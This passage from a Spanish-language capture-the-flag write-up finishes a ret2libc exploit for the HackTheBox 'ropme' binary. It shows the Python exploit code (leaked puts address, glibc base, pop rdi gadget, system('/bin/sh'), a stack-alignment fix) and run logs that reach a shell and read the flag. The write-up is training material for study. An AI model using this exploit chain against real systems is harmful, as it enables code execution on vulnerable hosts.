<span class=mtk1>glibc_base_addr</span> <span class=mtk5>=</span> <span class=mtk1>puts_addr</span> <span class=mtk5>-</span> <span class=mtk1>puts_offset</span>
<span class=mtk1>log</span><span class=mtk1>.</span><span class=mtk8>success</span><span class=mtk1>(</span><span class="mtk7 mtki">f</span><span class=mtk4>'Glibc</span> <span class=mtk4>base</span> <span class=mtk4>address:</span> <span class=mtk6>{</span><span class=mtk8>hex</span><span class=mtk1>(</span><span class=mtk1>glibc_base_addr</span><span class=mtk1>)</span><span class=mtk6>}</span><span class=mtk4>'</span><span class=mtk1>)</span>  
</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> <span class=mtku>solve.py</span>
[<span class=code-blue>*</span>] './ropme'
    Arch:     amd64-64-little
    RELRO:    <span class=code-dark-yellow>Partial RELRO</span>
    Stack:    <span class=code-dark-red>No canary found</span>
    NX:       <span class=code-dark-green>NX enabled</span>
    PIE:      <span class=code-dark-red>No PIE (0x400000)</span>
[<span class=code-green>+</span>] Starting local process './ropme': pid 26078  
[<span class=code-blue>*</span>] Leaked puts() address: 0x7f2c4ca42450
[<span class=code-green>+</span>] Glibc base address: 0x7f2c4c9be000
[<span class=code-blue>*</span>] Switching to interactive mode
ROP me outside, how 'about dah?
<span class=code-red>$</span>
</code></pre></div><p>Como comprobación, vemos que la dirección base de Glibc termina en <code>000</code> en hexadecimal, lo cual es correcto. Vamos a terminar el <em>exploit</em>:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk1>system_addr</span> <span class=mtk5>=</span> <span class=mtk1>glibc_base_addr</span> <span class=mtk5>+</span> <span class=mtk1>system_offset</span>
<span class=mtk1>bin_sh_addr</span> <span class=mtk5>=</span> <span class=mtk1>glibc_base_addr</span> <span class=mtk5>+</span> <span class=mtk1>bin_sh_offset</span>

<span class=mtk1>payload</span>  <span class=mtk5>=</span> <span class=mtk1>junk</span>
<span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p64(</span><span class=mtk1>pop_rdi_ret</span><span class=mtk1>)</span>
<span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p64(</span><span class=mtk1>bin_sh_addr</span><span class=mtk1>)</span>
<span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p64(</span><span class=mtk1>system_addr</span><span class=mtk1>)</span>

<span class=mtk1>p</span><span class=mtk1>.</span><span class=mtk8>sendlineafter</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>"ROP</span> <span class=mtk4>me</span> <span class=mtk4>outside,</span> <span class=mtk4>how</span> <span class=mtk4>'about</span> <span class=mtk4>dah?</span><span class=mtk6>\n</span><span class=mtk4>"</span><span class=mtk1>,</span> <span class=mtk1>payload</span><span class=mtk1>)</span>  

<span class=mtk1>p</span><span class=mtk1>.</span><span class=mtk8>interactive</span><span class=mtk1>()</span>
</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> <span class=mtku>solve.py</span>
[<span class=code-blue>*</span>] './ropme'
    Arch:     amd64-64-little
    RELRO:    <span class=code-dark-yellow>Partial RELRO</span>
    Stack:    <span class=code-dark-red>No canary found</span>
    NX:       <span class=code-dark-green>NX enabled</span>
    PIE:      <span class=code-dark-red>No PIE (0x400000)</span>
[<span class=code-green>+</span>] Starting local process './ropme': pid 28017  
[<span class=code-blue>*</span>] Leaked puts() address: 0x7f8fa02de450
[<span class=code-green>+</span>] Glibc base address: 0x7f8fa025a000
[<span class=code-blue>*</span>] Switching to interactive mode
[<span class=code-blue>*</span>] Got EOF while reading in interactive
<span class=code-red>$</span>
</code></pre></div><p>Pero no conseguimos una <em>shell</em>&mldr; Esto puede pasar debido al alineamiento de la pila (<em>stack alignment</em>). En binarios de 64 bits, la pila tiene que estar alineada a 16 bits, pero lo podemos solucionar con un <em>gadget</em> <code>ret</code> adicional antes de llamar a <code>system</code>. Teniendo en cuenta que <code>pop rdi; ret</code> es:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>pwn</span> asm -c amd64 <span class=code-dark-yellow>'pop rdi; ret'</span>  
5fc3

<span class=code-cyan>$</span> <span class=code-dark-green>pwn</span> asm -c amd64 <span class=code-dark-yellow>'ret'</span>
c3
</code></pre></div><p>Un <em>gadget</em> <code>ret</code> puede ser encontrado en la dirección de <code>pop rdi; ret</code> más uno:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk1>payload</span>  <span class=mtk5>=</span> <span class=mtk1>junk</span>
<span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p64(</span><span class=mtk1>pop_rdi_ret</span><span class=mtk1>)</span>
<span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p64(</span><span class=mtk1>bin_sh_addr</span><span class=mtk1>)</span>
<span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p64(</span><span class=mtk1>pop_rdi_ret</span> <span class=mtk5>+</span> <span class=mtk6>1</span><span class=mtk1>)</span>  
<span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p64(</span><span class=mtk1>system_addr</span><span class=mtk1>)</span>
</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> <span class=mtku>solve.py</span>
[<span class=code-blue>*</span>] './ropme'
    Arch:     amd64-64-little
    RELRO:    <span class=code-dark-yellow>Partial RELRO</span>
    Stack:    <span class=code-dark-red>No canary found</span>
    NX:       <span class=code-dark-green>NX enabled</span>
    PIE:      <span class=code-dark-red>No PIE (0x400000)</span>
[<span class=code-green>+</span>] Starting local process './ropme': pid 30007  
[<span class=code-blue>*</span>] Leaked puts() address: 0x7fcd41ae2450
[<span class=code-green>+</span>] Glibc base address: 0x7fcd41a5e000
[<span class=code-blue>*</span>] Switching to interactive mode
<span class=code-red>$</span> ls
ropme  solve.py
</code></pre></div><p>Genial, ahora vamos a lanzarlo contra la instancia remota:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> <span class=mtku>solve.py</span> 156.235.47.216:33045
[<span class=code-blue>*</span>] './ropme'
    Arch:     amd64-64-little
    RELRO:    <span class=code-dark-yellow>Partial RELRO</span>
    Stack:    <span class=code-dark-red>No canary found</span>
    NX:       <span class=code-dark-green>NX enabled</span>
    PIE:      <span class=code-dark-red>No PIE (0x400000)</span>
[<span class=code-green>+</span>] Opening connection to 156.235.47.216 on port 33045: Done  
[<span class=code-blue>*</span>] Leaked puts() address: 0x7faaec02c690
[<span class=code-green>+</span>] Glibc base address: 0x7faaebfa8240
[<span class=code-blue>*</span>] Switching to interactive mode
[<span class=code-blue>*</span>] Got EOF while reading in interactive
<span class=code-red>$</span>
</code></pre></div><p>No conseguimos una <em>shell</em> porque la instancia remota tiene una versión de Glibc diferente. Una manera de conseguirla es buscar por los últimos tres dígitos en hexadecimal de una fuga de memoria (por ejemplo, <code>puts</code>) en una página como <a href=https://libc.rip>https://libc.rip</a>. Vemos algunas versiones de Glibc que se ajustan a la búsqueda y los <em>offsets</em> más útiles:</p><p><img src=/images/HTB-Challenges/HTB-Pwn-ropme-1.png alt="Glibc search"></p><p>Afortunadamente, la versión que coincide con la que tiene la instancia remota es la primera. Después de cambiar los valores de los <em>offsets</em> en el <em>exploit</em> podremos conseguir una <em>shell</em> finalmente:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> <span class=mtku>solve.py</span> 156.235.47.216:33045
[<span class=code-blue>*</span>] './ropme'
    Arch:     amd64-64-little
    RELRO:    <span class=code-dark-yellow>Partial RELRO</span>
    Stack:    <span class=code-dark-red>No canary found</span>
    NX:       <span class=code-dark-green>NX enabled</span>
    PIE:      <span class=code-dark-red>No PIE (0x400000)</span>
[<span class=code-green>+</span>] Opening connection to 156.235.47.216 on port 33045: Done  
[<span class=code-blue>*</span>] Leaked puts() address: 0x7f92c3957690
[<span class=code-green>+</span>] Glibc base address: 0x7f92c38e8000
[<span class=code-blue>*</span>] Switching to interactive mode
<span class=code-red>$</span> ls
flag.txt
run_challenge.sh
ropme
<span class=code-red>$</span> cat flag.txt
HTB{r0p_m3_if_y0u_c4n!}
</code></pre></div><p>El <em>exploit</em> completo se puede encontrar aquí: <a href=https://github.com/7Rocky/HackTheBox-scripts/tree/main/Challenges/Pwn/ropme/solve.py><code>solve.py</code></a>.</p><div class="mt6 instapaper_ignoref"></div></div></article></main><footer class="bg-black bottom-0 w-100 pa3" role=contentinfo><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href=https://7rocky.github.io/ title=https://7rocky.github.io/>&copy; 7Rocky 2022</a><div style=margin-top:8px><div><div><a href=https://www.linkedin.com/in/roberto-gesteira-minarro/ target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href=https://github.com/7Rocky target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel=noopener aria-label="follow on GitHub——Opens in a new window"><svg height="32" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></footer></body></html>